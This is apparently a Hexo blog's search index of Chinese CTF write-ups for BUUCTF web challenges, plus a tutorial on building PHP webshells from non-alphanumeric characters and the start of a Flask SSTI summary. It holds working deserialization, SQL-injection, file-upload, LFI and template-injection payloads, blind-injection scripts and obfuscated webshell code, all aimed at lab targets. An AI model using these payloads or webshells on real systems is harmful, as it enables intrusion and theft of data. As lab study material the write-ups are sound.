{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index.html"},{"title":"friends","text":"","link":"/friends/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"BUUCTF[NPUCTF2020]web WP","text":"[TOC] BUUCTF[NPUCTF2020]上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up ReadlezPHP这是一道简单的反序列化的题进入页面没什么发现，只有一个跳转到西工大官网的链接，然后查看源码，发现一个隐藏的a标签 然后进入页面，看到了源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;if(isset($_GET['source'])){ highlight_file(__FILE__); die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]); 这段代码的关键在于当执行反序列化函数的时候，调用__destruct函数执行echo $b($a)，我们便可以利用这个函数执行任意我们想执行的函数，从而达到getshell的目的。接下来便是写php脚本构造序列化了，期间试了很多函数比如system等等都被禁用了，但是我们还可以用assert这个函数。首先我们来了解一下断言（assert）这个函数，参考大佬的文章PHP assert 和 eval assert 判断一个表达式是否成立。返回true or false； 我们来看一个例子： 1234&lt;?php$a = &quot;123&quot;;echo assert(is_numeric($a));?&gt; 这段代码输出的结果是： 简言之就是assert()可以将整个字符串参数当作php参数执行，而类似的eval()函数是执行合法的php代码。接下来放出序列化的脚本 12345678910111213&lt;?phpclass HelloPhp{ public $a; public $b; }$c = new HelloPhp;$c-&gt;b = 'assert';$c-&gt;a = 'eval($_POST[a]);';echo urlencode(serialize($c)).&quot;&lt;br/&gt;&quot;;?&gt; 这里除了用assert()之外，还可以用call_user_func()函数 call_user_func — 把第一个参数作为回调函数调用 12345678&lt;?php function barber($type){ echo &quot;you wanted a $type haircut, no problem\\n&quot;;}call_user_func('barber','mushroom');?&gt;//返回内容如下：//you wanted a mushroom haircut, no problem 只要构造出call_user_func(phpinfo)就好了 payload: 1?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D 成功得出结果： flag就在phpinfo中 得到flag！ 未完待续···","link":"/2020/05/28/Kath4rs1s/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2020/05/28/hello-world/"},{"title":"buuoj 刷题记录（一）","text":"[TOC] [网鼎杯 2020 朱雀组]phpweb 抓包 date是一个函数，后面的p应该是它的参数，猜测使用了call_user_func(函数名，参数)函数使用 func=readfile&amp;p=index.php 读取源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;, &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;, &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;, &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;, &quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;, &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;, &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;, &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;, &quot;file_put_contents&quot;);function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else { return &quot;&quot;; }}class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}/*$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); }} 禁用了很多函数，看到有 __destruct() 函数，尝试构造反序列化 12345678910111213141516&lt;?phpclass Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a = new Test();//$a-&gt;p = 'find / -name flag*';$a-&gt;p = 'cat /tmp/flagoefiu4r93';$a-&gt;func = 'system';print_r(urlencode(serialize($a))); 寻找flag文件 读取flag [MRCTF2020]你传你ma呢利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马 增加使用php解析的文件后缀(.jpg) 1AddType application/x-httpd-php .jpg 然后再写个一句话，连上蚁剑即可 [极客大挑战 2019]Upload绕过后缀名检验：php、php3、php5、php7、pht、phtml文件头加入 GIF89a修改 Content-Type: image/jpeg可解析为php的标签 12345&lt;?php phpinfo(); ?&gt;&lt;?= phpinfo(); ?&gt;&lt;script language=php&gt;phpinfo();&lt;/script&gt; //php7移除&lt;? phpinfo(); ?&gt; //需要php.ini中short_open_tag=On&lt;% phpinfo(); %&gt; //需要php.ini中asp_tags = On php7移除 php版本是5.5.9，用第三个上传之后连接蚁剑即可 [FBCTF2019]RCEService1234567891011121314151617181920212223&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; 正则表达式修饰符s匹配多行，这里直接用%0A换行符绕过正则payload： 1{%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A} Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 [SUCTF 2019]CheckIn 考点：文件上传 利用.user.ini构造php后门，.user.ini的使用前提是目录中必须有至少一个php文件，.user.ini有两个配置参数：auto_prepend_file和auto_append_file。auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： 1auto_prepend_file=01.gif 01.gif是要包含的文件。所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 参考链接https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html [GXYCTF2019]BabyUpload没什么好说的，apache服务器上传.htaccess文件 [BJDCTF 2nd]Schrödinger毫无意义的一道题，浪费了十几分钟的时间。 [MRCTF2020]PYWebsite查看源码有flag.php，访问然后修改X-Forwarded-For: 127.0.0.1可得flag [网鼎杯 2018]Comment 二次注入，git泄露 爆破得到账号密码，登陆然后是git泄露，先下载源码然后修复，得到如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; do=write的时候对传入的数据进行转移，但是之后数据库会自动清除反斜杠，然后do=commit的时候对取出的category没有进行处理就插入，导致了二次注入，所以前面那个addslashes根本起不到防护的作用第一次输入category和第二次输入content可以拼接，如下 1234insert into commentset category = '',content=user(),/*', content = '*/#', bo_id = '$bo_id'&quot;; 然后再放两个payload，读取flag: 12',content=(select load_file('/etc/passwd')),/*',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/* elementmaster这个没什么好说的，直接上脚本 12345678910111213141516import osimport requests as reqelements = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar', 'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr', 'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')for symbol in elements: link = &quot;http://bb55496d-1807-46ab-96ae-138ad4583386.node3.buuoj.cn/&quot; + symbol + &quot;.php&quot; response = req.get(link) if response.status_code == 200: print(response.text, end='') else: continue","link":"/2020/07/13/buuoj_01/"},{"title":"buuoj 刷题记录（二）","text":"[TOC] [CISCN2019 总决赛 Day2 Web1]Easyweb 考点：盲注，文件上传查看robots.txt： 12User-agent: *Disallow: *.php.bak 抓包过程发现user.php和image.php，于是下载源码，查看image.php 123456789101112131415161718&lt; ?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); GET请求id和path参数时首先经过addslashes()函数转义，在单引号，双引号，反斜杠和NULL前面加上反斜杠“\\”,然后再经过str_replace()函数把&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;中的任意一个替换为空，下面的select语句构造sql注入，传入的值为 1id=\\0&amp;path= or 1=1%23 经过addslashes()处理之后select语句就变成了 * from images where id12再经过str_replace()函数处理之后变成了```select * from images where id='\\' or path=' or 1=1%23'&quot;); 构造成功，盲注python脚本： 123456789101112131415161718192021222324import requestsurl = 'http://a9d9fc32-9b43-4a17-8c8b-d137102a6211.node3.buuoj.cn/image.php'flag = ''for i in range(1,100): for j in range(32,128): # payload = '?id=%5C0%27&amp;path=%20or%20if(ascii(mid(database(),{},1))={},1,0)%23'.format(i,j) # 数据库： ciscnfinal # payload = &quot;?id=%5C0%27&amp;path=%20or%20if(ascii(mid((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),{},1))={},1,0)%23&quot;.format(i,j) # 表名： images,users #payload = &quot;?id=%5C0%27&amp;path=%20or%20if(ascii(mid((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273),{},1))={},1,0)%23&quot;.format(i,j) # users列名： username,password payload = &quot;?id=%5C0&amp;path=%20or%20if(ascii(mid((select%20group_concat(password)%20from%20users),{},1))={},1,0)%23&quot;.format(i,j) # passwor: b5fef2a49e1cee3ee711 r = requests.get(url+payload) #print(url + path) if len(r.text)&gt;10000: flag += chr(j) print(flag) break if(j==127): breakprint(flag) 得到账号和密码登陆，是一个上传界面上传文件之后把上传日志记录到一个php文件，而没有给出文件路径，考虑文件名注入一句话，php被过滤，选择&lt;?= ?&gt;标签，即可，flag在根目录。 [BSidesCF 2019]Futurellaf12一键获取flag。 [WUSTCTF2020]朴实无华 考点：php弱类型，命令注入查看源码 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//level 1if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){ echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; }else{ die(&quot;金钱解决不了穷人的本质问题&quot;); }}else{ die(&quot;去非洲吧&quot;);}//level 2if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);}else{ die(&quot;去非洲吧&quot;);}//get flagif (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,&quot; &quot;)){ $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); }else{ die(&quot;快到非洲了&quot;); }}else{ die(&quot;去非洲吧&quot;);}?&gt; 一共有三层，第一层利用php弱类型，即可绕过 12intval('2e4')=2intval('2e4'+1)=20001 第二层也是弱类型，找到一个0e开头的字符串，其md5值也是0e开头的字符串即可绕过，写个脚本跑一下就出来了。第三层是执行命令，不能有空格和cat，空格用$IFS$9替换，cat用tac替换，然后读取flag。 [CISCN2019 华东南赛区]Web11 考点：ssti模板注入 打开页面发现页面会记录IP地址，第一时间想到存在XFF头注入，又看到提示Smarty,是模板注入了，抓包然后测试：当输入{1+1}的时候，显示2。看了看别人的writeup，smarty中的{if}标签中可以执行php语句，得flag： 1{if readfile('/flag')}{/if} [BSidesCF 2020]Had a bad day 考点：文件包含 进入页面两个按钮，随便点一个，出来一张图片，发现url变成了这样： 1http://e7a037d7-b95d-419a-ae85-6f3acf5e0ea5.node3.buuoj.cn/index.php?category=woofers 把woofers改为index发现不行，然后改为index woofer出现报错信息：可以发现include语句是这样的，获取url中的category参数然后拼接.php，然后包含这个php文件，尝试用伪协议读取文件： 1?category=php://filter/convert.base64-encode/resource=index base64解码得到index.php源码： 123456789101112&lt;?php$file = $_GET['category'];if(isset($file)){ if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;)){ include ($file . '.php'); } else{ echo &quot;Sorry, we currently only support woofers and meowers.&quot;; }}?&gt; 参数中必须包含index,woofers,meowers中的一个，然后这样刚好读到flag。 1?category=php://filter/convert.base64-encode/resource=index/../flag [CISCN2019 华北赛区 Day1 Web5]CyberPunk这道题真坑啊，进页面是几个输入框，各种提交，查询，修改，删除的功能，然后我在查询那里试了半天，试出一个异或注入，爆出数据库名后，没想到查表得时候发现select什么的都给ban了，也没法绕过，结果没办法，只能找其他方法了。 在主页有一个文件包含，用伪协议读取到所有文件的源码，源码就不一一放出来了，看两个比较重要的 12345678910111213141516171819202122232425262728293031323334353637//confirm.php&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if($fetch-&gt;num_rows&gt;0) { $msg = $user_name.&quot;已提交订单&quot;; }else{ $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;订单提交成功&quot;; }} else { $msg = &quot;信息不全&quot;;}?&gt; 从上面可以看到，对传入的user_name和phone进行了严格的过滤，但是对```address``却没有做过滤，再看看另一个文件， 1234567891011121314151617181920212223242526272829303132333435//change.php&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`='&quot;.$address.&quot;', `old_address`='&quot;.$row['address'].&quot;' where `user_id`=&quot;.$row['user_id']; $result = $db-&gt;query($sql); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;订单修改成功&quot;; } else { $msg = &quot;未找到订单!&quot;; }}else { $msg = &quot;信息不全&quot;;}?&gt; 这里对刚刚传入的address参数没有做任何处理就放进了数据表中，那么我们只要在原始传入带有sql注入的address参数，然后在这个页面发起请求，那个sql语句就会被触发，然后就可以成功执行sql注入。思路有了以后，构造payload,这里用的是报错注入： 11' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)# 直接读取显示不全，分两段读取payload： 11' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e),1)# 然后就得到flag了。 [WesternCTF2018]shrine","link":"/2020/07/20/buuoj-02/"},{"title":"无字母数字构造webshell的学习","text":"[toc] 前言最近碰到一道题，便学习了一下相关无字母数字构造webshell的知识。题目如下： 12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)&gt;40){ die(&quot;Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code);}else{ highlight_file(__FILE__);}//$hint = &quot;php function getFlag() to get flag&quot;;?&gt; 题目中可以看到字母和数字是没法使用的，而且payload长度必须在40以内。我们需要绕过正则过滤，利用不可见字符或者正则表达式遗漏的字符通过各种变换来构造出a-z中的任意一个字符，并且长度小于40，然后再利用php允许动态函数执行的特点，拼接出一个函数名，然后动态执行之即可。那么，我们现在的问题就是如何通过各种变换，是的我们能够成功构造出所需的函数，然后拿到webshell。 前置知识php5和7的差异：php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。 php特性(1)代码中没有引号的字符都自动作为字符串 我猜这也是为什么传马的时候$_GET['cmd']和$_GET[cmd]都可以 (2)Ascii码大于 0x7F 的字符都会被当作字符串 (3)php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型 (4)在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理所以有${_GET}{cmd} 不使用数字字母构造数字利用了php弱类型的特性，true的值为1，所以true+true==2。 12$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //$__=2$_=$__/$__; //$_=1 在php中未定义的变量默认值为null，null==false==0，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。 123&lt;?php$_++; //$_=1 也可以用!操作符来进行布尔类型的转换。 1234&lt;?phpecho !$_;//这个代码将输出1?&gt; 构造webshell构造无字母数字webshell一般用到下面这几种方法： 异或在php中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，想得到a-z中的某个字母，就找到某两个非字母、数字的字符，他们异或的结果是这个字母即可。 12345&lt;?php echo &quot;A&quot;^&quot;?&quot;;?&gt;运行结果：~ 输出的结果是字符”~”，这是因为代码对字符”A”和字符”?”进行了异或操作。在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。例如下面这个php后门： 123456&lt;?php$_=(':'^'[').('('^'[').('('^'[').('&gt;'^'[').(')'^'[').('/'^'['); // $_='assert';$__='_'.('+'^'{').('/'^'`').('('^'{').('/'^'{'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; 执行结果如下： 取反来看一个汉字”和” 123456&gt;&gt;&gt; print(&quot;和&quot;.encode('utf8'))b'\\xe5\\x92\\x8c'&gt;&gt;&gt; print(&quot;和&quot;.encode('utf8')[2])140&gt;&gt;&gt; print(~&quot;和&quot;.encode('utf8')[2])-141 “和”的第三个字节的值为140[0x8c]，取反的值为-141。负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。因此 1234567&lt;?php$_=&quot;和&quot;;print(~($_{2}));print(~&quot;\\x8c&quot;);?&gt;两个写法性质一样结果会输出： ss py脚本： 123456def get(shell): hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit)get('phpinfo')#0x8f0x970x8f0x960x910x990x90 直接贴出p神的webshell吧 1234567891011&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //$__=2$_=$__/$__; //$_=1$____='';$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__}); //assert$_____='_';$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_}); //_POST$_=$$_____; //$_POST$____($_[$__]); //assert($_POST[2]) 这里也有一种简短的写法${~”\\xa0\\xb8\\xba\\xab”}它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。 利用字符串自增/自减php的小技巧，先看文档：https://www.php.net/manual/zh/language.operators.increment.php也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array： 12345&lt;?php$_=[];$_=@&quot;$_&quot;; // $_='Array';echo $_[0].$_[3];// 输出Aa 再加上我们不适用数字构造出的数字，写出下面这个webshell： 12345678910111213141516171819202122232425262728293031323334&lt;?$_=[];$_=@&quot;$_&quot;; // $_='Array执行成功： payload在上面那道题中有一个payload是这样的： 1?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo 这里利用了php7中执行动态函数的方法，在php5中是执行不成功的，我们来拆解分析一下payload： 12345678%ff ^ %160 = _%ff ^ %184 = G%ff ^ %186 = E%ff ^ %171 = T%ff%ff%ff%ff^%a0%b8%ba%ab = _GET${%ff%ff%ff%ff^%a0%b8%ba%ab} = $_GET${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff} = $_GET{%ff}phpinfo() 这里放出一个fuzz脚本，帮助快速找到异或的字符： 12345678910111213$payload = '';$argv = str_split('_GET');for ($i=0; $i &lt; count($argv); $i++) { for ($j=0; $j &lt; 255; $j++) { $k = chr($j)^chr(255); //dechex(255)=0xff if($k == $argv[$i]){ echo &quot;%ff ^ %&quot;.$j.&quot; = &quot;.$k.&quot;&lt;br&gt;&quot;; $payload .= '%'.dechex($j); } }}echo $payload; 还有一个payload是这样的，这个是取反： 1(~%8F%97%8F%96%91%99%90)(); 还有这个payload，也是取反: 1?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=phpinfo 这个是~在{}中执行了取反操作，所以${~”\\xa0\\xb8\\xba\\xab”}取反相当于$_GET。 脚本总结寻找异或字符脚本1234567891011121314151617&lt;?php$payload = [writelist];for($k=1;$k&lt;=sizeof($payload);$k++){ for($i = 0;$i &lt; 9; $i++){ for($j = 0;$j &lt;=9;$j++){ $exp = $payload[$k] ^ $i.$j; if($exp=='_G'){ echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;); echo &quot;&lt;br /&gt;&quot;; } if($exp=='ET'){ echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;); echo &quot;&lt;br /&gt;&quot;; } } }} 寻找取反字符脚本1234567```def get(shell): hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit)get('phpinfo')//0x8f0x970x8f0x960x910x990x90 ```","link":"/2020/07/23/webshell/"},{"title":"Flask ssti模板注入一些总结","text":"[TOC] ssti思路服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 ssti模板注入的基本思路就是通过__class__属性找到基类object，通过__subclasses__()查看object中有哪些类可以使用，一般都是去寻找os类，然后通过blobals全局来查找所有的方法及变量及参数，通常用到&lt;class 'os._wrap_close'&gt;类的popen方法。 基本流程首先获取基本类首先通过str、dict、tuple或list等获取python的基本类 dict：保存类实例或对象实例的属性变量键值对字典 class：返回调用的参数类型 mro：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 bases：返回类型列表 subclasses：返回object的子类 init：类的初始化方法 globals：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 也可以用一些其他在jinja2中存在的对象，比如request。在Python中，每个类都有一个bases属性，列出其基类，而mro返回的时解析方法调用的顺序，在其中选择object类就好了。 ''.__class__.__base__ ''.__class__.__mro__[1] &quot;&quot;.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] {}.__class__.__mro__[1] request.__class__.__mro__[1] 可以借助```getitem绕过中括号的限制： ''.__class__.__mro__.__getitem__(1) {}.__class__.__bases__.__getitem__(0) ().__class__.__bases__.__getitem__(0) request.__class__.__mro__.__getitem__(1) 寻找方法获取基本类后，继续向下获取基本类object的子类： 1&quot;&quot;.__class__.__bases__[0].__subclasses__() 找到重载过的init类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）： 